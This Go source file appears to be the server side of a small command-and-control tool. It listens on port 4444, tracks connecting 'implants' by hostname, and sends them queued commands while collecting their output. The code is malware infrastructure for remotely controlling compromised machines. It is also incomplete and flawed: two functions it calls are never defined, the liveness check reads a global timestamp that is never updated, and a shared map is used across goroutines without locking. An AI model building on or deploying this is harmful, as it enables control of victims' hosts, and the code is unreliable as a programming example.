package main

import (
	"bufio"
	"log"
	"net"
	"strings"
	"time"
)

type Implant struct {
	Hostname string
	LastSeen time.Time
	Active   bool
	Command  string
}

var implants = make(map[string]*Implant)

var lastSeen time.Time

func initalizeServer() {
	listen, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatal("[-] Error", err)
	}

	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Println("[-] Error accepting connection")
			continue
		}

		go handleImplants(conn)
	}
}

func checkImplantStatus() {

	for {
		time.Sleep(10 * time.Second)
		for _, implant := range implants {
			if time.Since(lastSeen) > 30*time.Second {
				implant.Active = false
			} else {
				implant.Active = true
			}
		}
	}
}

func GetHostname(reader *bufio.Reader) string {
	hostname, err := reader.ReadString('\n')
	if err != nil {
		return "unknown"
	}
	return strings.TrimSpace(hostname)

}

func handleImplants(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	hostname := GetHostname(reader)
	if _, exists := implants[hostname]; !exists { // looks up hostname checks if it exsists if it doesnt create new and store it
		implants[hostname] = &Implant{}
	}
	implants[hostname].Hostname = hostname
	implants[hostname].LastSeen = time.Now()
	implants[hostname].Active = true
	if implants[hostname].Command != "" {
		sendCommands(conn, implants[hostname].Command)
		implants[hostname].Command = ""
		receiveOutput(reader)
	}
}
